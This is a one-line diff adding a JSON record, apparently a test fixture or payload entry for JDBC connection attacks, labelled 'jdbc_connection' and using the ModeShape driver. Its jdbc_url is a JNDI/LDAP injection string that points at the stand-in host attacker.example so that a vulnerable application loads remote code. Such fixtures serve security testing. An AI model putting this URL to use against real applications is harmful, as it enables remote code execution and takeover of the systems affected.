@@ -1,0 +1,1 @@
+{"attack_type":"jdbc_connection","driver":"modeshape","driver_class":"org.modeshape.jdbc.LocalJcrDriver","jdbc_url":"jdbc:jcr:jndi:ldap://attacker.example/exploit","url_params":{},"credentials":{"user":"","password":""},"pool":"","pool_config":{},"sql_payload":"","deser_properties":{}}
